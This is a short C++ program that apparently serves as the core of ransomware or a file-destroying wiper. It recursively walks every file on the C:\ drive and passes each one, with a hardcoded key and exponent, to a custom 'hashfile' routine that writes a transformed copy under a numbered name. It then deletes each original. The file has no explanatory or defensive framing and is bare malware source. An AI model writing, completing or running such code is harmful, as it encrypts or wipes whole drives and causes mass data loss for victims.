#include "hashlib.hpp"
#include "polylib.hpp"

using namespace std;
namespace fs = filesystem;

int main() {
    uint64_t e = 9134674975062410438;
    uint64_t key = 2669143902719107840;
    fs::path root = "C:\\";
    vector<string> paths;
    vector<string> fileppaths;
    vector<string> fileext;

    auto options = fs::directory_options::skip_permission_denied;

    gennoise((uint64_t)(time(NULL)));

    for (const auto& file : fs::recursive_directory_iterator(root, options)) {
        if (fs::is_regular_file(file.path())) {
            paths.push_back(file.path().string());
            fileppaths.push_back((file.path().parent_path()).string());
            fileext.push_back((file.path().extension()).string());
        }
    }

    vector<string> newnames;

    for (uint64_t i = 0; i < paths.size(); i++) {
        newnames.push_back((fileppaths[i] + "\\" + to_string(i) + fileext[i]));
    }

    for (uint64_t j = 0; j<paths.size(); j++) {
        hashfile(key, e, paths[j], newnames[j]);
        fs::remove(paths[j]);
    }
    return 0;
}